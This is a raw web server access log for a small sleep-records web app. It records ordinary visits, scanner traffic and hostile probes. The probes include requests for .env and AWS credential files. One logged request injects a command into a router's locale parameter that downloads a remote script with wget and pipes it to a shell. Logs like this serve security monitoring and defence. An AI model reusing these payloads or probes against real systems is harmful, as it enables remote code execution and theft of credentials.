172.71.127.96 - - [16/Jan/2025:15:48:08 +0000] "GET / HTTP/2.0" 200 6758 "https://cake.furosha.com/register" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36"
172.71.127.96 - - [16/Jan/2025:15:48:15 +0000] "GET /login HTTP/2.0" 200 4329 "https://cake.furosha.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36"
172.71.127.96 - - [16/Jan/2025:15:48:20 +0000] "POST /login HTTP/2.0" 302 0 "https://cake.furosha.com/login" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36"
172.71.127.96 - - [16/Jan/2025:15:48:20 +0000] "GET /sleep-records HTTP/2.0" 200 18755 "https://cake.furosha.com/login" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36"
172.71.127.95 - - [16/Jan/2025:15:48:42 +0000] "GET / HTTP/2.0" 200 6567 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36"
172.71.127.95 - - [16/Jan/2025:15:48:44 +0000] "GET /sleep-records HTTP/2.0" 200 18755 "https://cake.furosha.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36"
172.71.127.95 - - [16/Jan/2025:15:48:46 +0000] "GET /users/index HTTP/2.0" 200 5472 "https://cake.furosha.com/sleep-records" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36"
147.45.112.158 - - [16/Jan/2025:15:51:52 +0000] "\x03\x00\x00/*\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Administr" 400 150 "-" "-"
172.105.239.183 - - [16/Jan/2025:16:08:56 +0000] "GET / HTTP/1.1" 400 248 "-" "Mozilla/5.0 zgrab/0.x"
89.248.165.71 - - [16/Jan/2025:17:34:44 +0000] "\x05\x01\x00" 400 150 "-" "-"
89.248.165.71 - - [16/Jan/2025:17:34:44 +0000] "CONNECT example.com:443 HTTP/1.1" 400 150 "-" "-"
172.69.155.126 - - [16/Jan/2025:18:42:40 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=read HTTP/2.0" 404 792 "http://cake.furosha.com/cgi-bin/luci/;stok=/locale?form=country&operation=read" "-"
188.166.91.50 - - [16/Jan/2025:19:30:26 +0000] "GET / HTTP/1.1" 200 6777 "-" "Mozilla/5.0 (compatible)"
188.166.91.50 - - [16/Jan/2025:19:30:27 +0000] "GET /favicon.ico HTTP/1.1" 200 15086 "https://93.2.205.34/" "Mozilla/5.0 (compatible)"
172.69.59.63 - - [16/Jan/2025:22:02:51 +0000] "GET / HTTP/2.0" 200 6758 "http://cake.furosha.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/126.0.0.0 Safari/537.36"
172.68.225.122 - - [16/Jan/2025:22:22:40 +0000] "GET / HTTP/2.0" 200 6758 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0"
172.69.134.209 - - [16/Jan/2025:22:23:02 +0000] "GET /favicon.ico HTTP/2.0" 200 15086 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11"
172.71.155.57 - - [16/Jan/2025:22:23:05 +0000] "GET /robots.txt HTTP/2.0" 404 744 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11"
162.158.167.25 - - [16/Jan/2025:22:23:09 +0000] "GET /sitemap.xml HTTP/2.0" 404 745 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11"
162.158.193.195 - - [16/Jan/2025:22:23:23 +0000] "GET /config.json HTTP/2.0" 404 745 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11"
172.69.134.225 - - [16/Jan/2025:22:24:22 +0000] "GET / HTTP/2.0" 200 6758 "http://cake.furosha.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11"
172.68.23.113 - - [16/Jan/2025:22:24:27 +0000] "GET /favicon.ico HTTP/2.0" 200 15086 "http://cake.furosha.com/favicon.ico" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11"
172.68.211.171 - - [16/Jan/2025:22:24:33 +0000] "GET /robots.txt HTTP/2.0" 404 744 "http://cake.furosha.com/robots.txt" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11"
172.69.134.166 - - [16/Jan/2025:22:24:38 +0000] "GET /sitemap.xml HTTP/2.0" 404 745 "http://cake.furosha.com/sitemap.xml" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11"
40.118.214.29 - - [16/Jan/2025:22:38:55 +0000] "GET /actuator/health HTTP/1.1" 404 761 "-" "Mozilla/5.0 zgrab/0.x"
172.68.159.54 - - [17/Jan/2025:00:24:08 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=read HTTP/2.0" 404 792 "http://cake.furosha.com/cgi-bin/luci/;stok=/locale?form=country&operation=read" "-"
123.160.223.74 - - [17/Jan/2025:00:53:12 +0000] "GET / HTTP/1.1" 200 6771 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
123.160.223.74 - - [17/Jan/2025:00:53:12 +0000] "GET /favicon.ico HTTP/1.1" 200 15086 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
123.160.223.72 - - [17/Jan/2025:00:54:55 +0000] "GET / HTTP/1.1" 200 6771 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
123.160.223.73 - - [17/Jan/2025:00:54:56 +0000] "GET /favicon.ico HTTP/1.1" 200 15086 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
172.69.6.150 - - [17/Jan/2025:01:01:47 +0000] "GET / HTTP/2.0" 200 6758 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
172.69.6.89 - - [17/Jan/2025:01:01:54 +0000] "GET /favicon.ico HTTP/2.0" 304 0 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
52.228.153.93 - - [17/Jan/2025:01:07:51 +0000] "GET / HTTP/1.1" 200 6777 "-" "Mozilla/5.0 zgrab/0.x"
185.242.226.100 - - [17/Jan/2025:01:16:20 +0000] "GET / HTTP/1.1" 200 6771 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
172.71.98.10 - - [17/Jan/2025:01:16:23 +0000] "GET / HTTP/2.0" 200 6758 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
172.70.131.142 - - [17/Jan/2025:01:18:54 +0000] "GET / HTTP/2.0" 200 6758 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
167.94.138.123 - - [17/Jan/2025:01:20:35 +0000] "GET / HTTP/1.1" 200 6771 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.94.138.123 - - [17/Jan/2025:01:20:39 +0000] "GET /favicon.ico HTTP/1.1" 200 15086 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
13.91.166.38 - - [17/Jan/2025:01:25:40 +0000] "GET /version HTTP/1.1" 404 753 "-" "Mozilla/5.0 zgrab/0.x"
162.158.148.219 - - [17/Jan/2025:01:28:16 +0000] "GET / HTTP/2.0" 200 6758 "-" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Mobile Safari/537.36"
172.69.225.193 - - [17/Jan/2025:01:28:16 +0000] "GET /css/cake.css HTTP/2.0" 200 6020 "-" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Mobile Safari/537.36"
172.69.225.160 - - [17/Jan/2025:01:28:16 +0000] "GET /css/normalize.min.css HTTP/2.0" 200 2057 "-" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Mobile Safari/537.36"
162.158.148.151 - - [17/Jan/2025:01:28:16 +0000] "GET /css/milligram.min.css HTTP/2.0" 200 9077 "-" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Mobile Safari/537.36"
176.113.115.249 - - [17/Jan/2025:01:33:35 +0000] "GET / HTTP/1.1" 200 6771 "-" "Mozilla/5.0"
172.71.158.206 - - [17/Jan/2025:01:57:26 +0000] "GET /api/admin/login HTTP/2.0" 404 749 "-" "python-requests/2.32.3"
154.213.184.16 - - [17/Jan/2025:02:09:59 +0000] "GET / HTTP/1.1" 200 6777 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
172.70.210.230 - - [17/Jan/2025:02:49:33 +0000] "GET / HTTP/2.0" 200 6758 "-" "Mozilla/5.0 (X11; Linux i686; rv:109.0) Gecko/20100101 Firefox/120.0"
172.68.159.179 - - [17/Jan/2025:03:00:18 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=read HTTP/2.0" 404 792 "http://cake.furosha.com/cgi-bin/luci/;stok=/locale?form=country&operation=read" "-"
89.248.163.216 - - [17/Jan/2025:03:03:19 +0000] "\x03\x00\x00\x13\x0E\xE0\x00\x00\x00\x00\x00\x01\x00\x08\x00\x02\x00\x00\x00" 400 150 "-" "-"
172.70.214.50 - - [17/Jan/2025:03:22:11 +0000] "GET / HTTP/2.0" 200 6758 "-" "Mozilla/5.0 (X11; Linux i686; rv:109.0) Gecko/20100101 Firefox/120.0"
57.129.64.237 - - [17/Jan/2025:03:41:08 +0000] "GET / HTTP/1.1" 200 6771 "-" "Mozilla/5.0 (compatible; ModatScanner/1.0; +https://modat.io/)"
172.68.10.219 - - [17/Jan/2025:03:52:49 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/2.0" 200 6758 "http://cake.furosha.com/?XDEBUG_SESSION_START=phpstorm" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
87.120.115.34 - - [17/Jan/2025:04:11:38 +0000] "GET /.env HTTP/1.1" 404 750 "-" "Mozilla/5.0 (Knoppix; Linux i686; rv:128.0) Gecko/20100101 Firefox/128.0"
172.71.98.76 - - [17/Jan/2025:04:16:42 +0000] "GET / HTTP/2.0" 200 6758 "-" "Mozilla/5.0 (Linux; Android 9; SM-G973U1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36"
172.69.136.134 - - [17/Jan/2025:04:39:36 +0000] "GET /actuator/gateway/routes HTTP/2.0" 404 757 "http://cake.furosha.com/actuator/gateway/routes" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
5.181.190.248 - - [17/Jan/2025:04:41:33 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=read HTTP/1.1" 404 804 "-" "-"
3.136.17.203 - - [17/Jan/2025:05:05:31 +0000] "GET / HTTP/1.1" 400 650 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/126.0.0.0 Safari/537.36"
3.136.17.203 - - [17/Jan/2025:05:05:38 +0000] "GET / HTTP/1.1" 200 6771 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/126.0.0.0 Safari/537.36"
34.22.213.78 - - [17/Jan/2025:05:15:22 +0000] "GET / HTTP/1.1" 400 248 "-" "python-requests/2.32.3"
109.237.26.64 - - [17/Jan/2025:05:22:30 +0000] "GET / HTTP/2.0" 200 6758 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:8.0) Gecko/20100101 Firefox/8.0"
13.71.128.118 - - [17/Jan/2025:05:29:17 +0000] "GET / HTTP/1.1" 200 6771 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.98 Safari/537.36"
92.255.57.86 - - [17/Jan/2025:05:38:04 +0000] "GET /remote/login HTTP/1.1" 404 758 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 Edg/115.0.1901.203"
92.255.57.86 - - [17/Jan/2025:05:38:04 +0000] "GET /login HTTP/1.1" 200 4342 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 Edg/115.0.1901.203"
3.134.109.31 - - [17/Jan/2025:05:41:07 +0000] "GET / HTTP/1.1" 400 650 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/126.0.0.0 Safari/537.36"
18.217.148.56 - - [17/Jan/2025:05:42:44 +0000] "GET / HTTP/1.1" 200 6777 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/126.0.0.0 Safari/537.36"
18.217.148.56 - - [17/Jan/2025:05:42:53 +0000] "GET / HTTP/1.1" 200 6771 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/126.0.0.0 Safari/537.36"
3.134.109.31 - - [17/Jan/2025:05:43:29 +0000] "GET / HTTP/1.1" 200 6771 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/126.0.0.0 Safari/537.36"
109.117.169.254 - - [17/Jan/2025:05:49:59 +0000] "GET / HTTP/1.0" 200 6758 "-" "-"
162.158.103.207 - - [17/Jan/2025:05:50:17 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=read HTTP/2.0" 404 792 "http://cake.furosha.com/cgi-bin/luci/;stok=/locale?form=country&operation=read" "-"
35.240.7.120 - - [17/Jan/2025:05:53:07 +0000] "GET / HTTP/1.1" 200 6777 "-" "python-requests/2.32.3"
210.176.44.217 - - [17/Jan/2025:05:59:36 +0000] "*\xAD\xCC\x8C^\xF2\xD7BO\x8C\xC8\x05A~\xBA\xC93n\xAB\xE9%a\x9E\xDA\x16R\x8F\xCC\x08E\x81\xBD\xFA5r\xB0\xEB(e\xA0\xDD\x19V\x93\xCF\x0CH\x84\xC1\xFC9w\xB2\xEF+g\xA4\xE0\x1CZ\x96\xD2\x0EK\x88\xC3\x00>y\xB6\xF2.k\xA7\xE3!]\x99\xD5\x12N\x8A\xC7" 400 150 "-" "-"
195.134.178.97 - - [17/Jan/2025:06:07:30 +0000] "GET / HTTP/1.0" 200 6758 "-" "-"
172.71.183.182 - - [17/Jan/2025:06:08:33 +0000] "GET / HTTP/2.0" 200 6758 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.3"
141.101.76.28 - - [17/Jan/2025:06:08:33 +0000] "GET /favicon.ico HTTP/2.0" 200 15086 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.3"
172.70.47.151 - - [17/Jan/2025:06:08:33 +0000] "GET /ads.txt HTTP/2.0" 404 741 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.3"
172.71.99.70 - - [17/Jan/2025:06:08:34 +0000] "GET /app-ads.txt HTTP/2.0" 404 745 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.3"
172.71.102.100 - - [17/Jan/2025:06:08:34 +0000] "GET /sellers.json HTTP/2.0" 404 746 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.3"
51.158.205.65 - - [17/Jan/2025:06:08:36 +0000] "GET / HTTP/1.1" 200 6771 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.3"
51.158.205.65 - - [17/Jan/2025:06:08:36 +0000] "GET /favicon.ico HTTP/1.1" 200 15086 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.3"
51.158.205.65 - - [17/Jan/2025:06:08:37 +0000] "GET /ads.txt HTTP/1.1" 404 753 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.3"
51.158.205.65 - - [17/Jan/2025:06:08:37 +0000] "GET /app-ads.txt HTTP/1.1" 404 757 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.3"
51.158.205.65 - - [17/Jan/2025:06:08:38 +0000] "GET /sellers.json HTTP/1.1" 404 758 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.3"
108.162.238.77 - - [17/Jan/2025:06:15:37 +0000] "GET / HTTP/2.0" 200 6758 "http://cake.furosha.com/" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
139.59.159.155 - - [17/Jan/2025:06:30:19 +0000] "GET / HTTP/1.1" 200 6771 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36"
185.189.182.234 - - [17/Jan/2025:06:35:39 +0000] "GET / HTTP/1.1" 400 150 "-" "-"
172.70.131.170 - - [17/Jan/2025:07:17:58 +0000] "GET / HTTP/2.0" 200 6758 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
172.234.96.249 - - [17/Jan/2025:07:32:56 +0000] "0>+\xF6\x06\xAA\x9B\x16\xD94444" 400 150 "-" "-"
172.70.160.160 - - [17/Jan/2025:07:33:21 +0000] "GET / HTTP/2.0" 200 6758 "-" "Mozilla/5.0 (Linux; Android 10; LIO-AN00 Build/HUAWEILIO-AN00; wv) MicroMessenger Weixin QQ AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.62 XWEB/2692 MMWEBSDK/200901 Mobile Safari/537.36"
172.70.162.41 - - [17/Jan/2025:07:33:41 +0000] "GET / HTTP/2.0" 200 6758 "-" "Mozilla/5.0 (Linux; Android 10; LIO-AN00 Build/HUAWEILIO-AN00; wv) MicroMessenger Weixin QQ AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.62 XWEB/2692 MMWEBSDK/200901 Mobile Safari/537.36"
157.245.143.130 - - [17/Jan/2025:07:42:38 +0000] "\x00\x0E8\x01\x01\x01\x01\x01\x01\x01\x01\x00\x00\x00\x00\x00" 400 150 "-" "-"
185.242.226.109 - - [17/Jan/2025:07:43:40 +0000] "GET / HTTP/1.1" 200 6771 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36"
4.151.218.179 - - [17/Jan/2025:08:06:25 +0000] "GET /owa/auth/x.js HTTP/1.1" 404 759 "-" "Mozilla/5.0 zgrab/0.x"
128.199.170.18 - - [17/Jan/2025:08:21:30 +0000] "GET /hello HTTP/1.1" 400 248 "-" "Mozilla/5.0"
162.158.103.55 - - [17/Jan/2025:08:22:32 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=read HTTP/2.0" 404 792 "http://cake.furosha.com/cgi-bin/luci/;stok=/locale?form=country&operation=read" "-"
172.70.46.236 - - [17/Jan/2025:09:16:44 +0000] "GET / HTTP/2.0" 200 6758 "http://cake.furosha.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36"
87.120.115.34 - - [17/Jan/2025:09:45:42 +0000] "GET /_profiler/phpinfo HTTP/1.1" 404 763 "-" "Mozilla/5.0 (SS; Linux i686; rv:120.0) Gecko/20100101 Firefox/120.0"
172.71.254.181 - - [17/Jan/2025:09:51:16 +0000] "GET / HTTP/2.0" 200 6758 "http://cake.furosha.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/126.0.0.0 Safari/537.36"
172.70.90.203 - - [17/Jan/2025:10:20:57 +0000] "GET / HTTP/2.0" 200 6758 "http://cake.furosha.com/" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
172.70.86.175 - - [17/Jan/2025:10:24:58 +0000] "GET / HTTP/2.0" 200 6758 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:8.0) Gecko/20100101 Firefox/8.0"
162.216.149.88 - - [17/Jan/2025:10:43:20 +0000] "GET / HTTP/1.1" 200 6777 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
92.255.57.58 - - [17/Jan/2025:11:14:41 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 6771 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
172.71.183.64 - - [17/Jan/2025:11:21:13 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.163.215.73%2Fmoo+-O-+|+sh%60) HTTP/2.0" 404 869 "http://cake.furosha.com/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.163.215.73%2Fmoo+-O-+|+sh%60)" "Go-http-client/1.1"
78.153.140.177 - - [17/Jan/2025:11:40:31 +0000] "GET /.env HTTP/1.1" 400 248 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; sv) AppleWebKit/522.11.3 (KHTML, like Gecko) Version/3.0 Safari/522.11.3"
78.153.140.177 - - [17/Jan/2025:11:40:32 +0000] "GET /.ENV HTTP/1.1" 400 248 "-" "Mozilla/5.0 (Windows NT 5.2; rv:2.0b13pre) Gecko/20110304 Firefox/4.0b13pre"
78.153.140.177 - - [17/Jan/2025:11:40:32 +0000] "GET /.env HTTP/1.1" 404 750 "-" "Mozilla/5.0 (X11; U; Linux x86_64; en-GB; rv:1.9.0.2) Gecko/2008092213 Ubuntu/8.04 (hardy) Firefox/3.0.2"
78.153.140.177 - - [17/Jan/2025:11:40:33 +0000] "GET /.ENV HTTP/1.1" 404 750 "-" "Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36"
78.153.140.177 - - [17/Jan/2025:11:40:33 +0000] "GET /.Env HTTP/1.1" 400 650 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Maxthon/4.4.7.1000 Chrome/30.0.1599.101 Safari/537.36"
78.153.140.177 - - [17/Jan/2025:11:40:33 +0000] "GET /.AWS/credentials HTTP/1.1" 400 650 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; InfoPath.2)"
78.153.140.177 - - [17/Jan/2025:11:40:34 +0000] "GET /.AWS/CREDENTIALS HTTP/1.1" 400 650 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36"
78.153.140.177 - - [17/Jan/2025:11:40:34 +0000] "GET /.Env HTTP/1.1" 404 750 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/525.13 (KHTML, like Gecko) Chrome/0.2.149.6 Safari/525.13"
78.153.140.177 - - [17/Jan/2025:11:40:35 +0000] "GET /.Aws/credentials HTTP/1.1" 400 248 "-" "Mozilla/5.0 (Linux; U; Android 4.1.2; en-us; N861 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30"
78.153.140.177 - - [17/Jan/2025:11:40:35 +0000] "GET /.CONFIG.yaml HTTP/1.1" 400 650 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.63 Safari/537.36"
78.153.140.177 - - [17/Jan/2025:11:40:35 +0000] "GET /.Config.yaml HTTP/1.1" 400 248 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.7) Gecko/20050414 Firefox/1.0.3 (ax)"
78.153.140.177 - - [17/Jan/2025:11:40:36 +0000] "GET /.AWS/credentials HTTP/1.1" 404 762 "-" "Mozilla/5.0 (iPad; U; CPU OS 4_3_5 like Mac OS X; fi-fi) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8L1 Safari/6533.18.5"
